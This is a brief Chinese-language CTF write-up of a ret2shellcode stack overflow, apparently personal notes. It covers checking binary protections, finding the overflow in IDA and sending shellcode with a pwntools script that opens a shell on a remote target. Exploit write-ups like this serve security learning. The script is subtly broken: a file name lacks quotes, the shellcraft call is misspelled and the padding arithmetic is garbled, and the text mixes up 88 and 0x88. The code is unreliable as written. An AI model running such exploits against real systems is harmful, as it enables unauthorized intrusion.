第一步：用我们的 `checksec` 来找到我们的对应的框架是什么。
![[Pasted image 20231204214643.png]]
然后，我们发现，我们这个已经打开了我们的 `RWX segments`,并且我们的栈本身是可读可写可执行的。

第二步：用我们的 `IDA` 打开我们的函数，我们能够发现我们具有下面的特性。
![[Pasted image 20231204214746.png]]
我们发现，我们能够直接获得我们的 buf 的地址在哪里，然后我们可以向我们的这个缓冲区溢出，因为我们的缓冲区 `长度位88`，实际写入是最多 `100`

第三步：我们就可以把我们的 `shellcode` 写入到我们的 `buf` 地址中，然后把这个地址作为偶们的 shellcode 地址，让我们溢出。

```python
from pwn import *
io=remote("11.11.11.1",1111)
elf=ELF(./ret2shellcode)
shellcode=asm(shellcodecraft.sh())
text=io.recvline();
buf_addr=int(text,16)
payload=shellcode+b'a'*90*(0x88+0x4-len(shellcode))+p32(buf_addr)
io.sendline(payload)
io.interactive()
```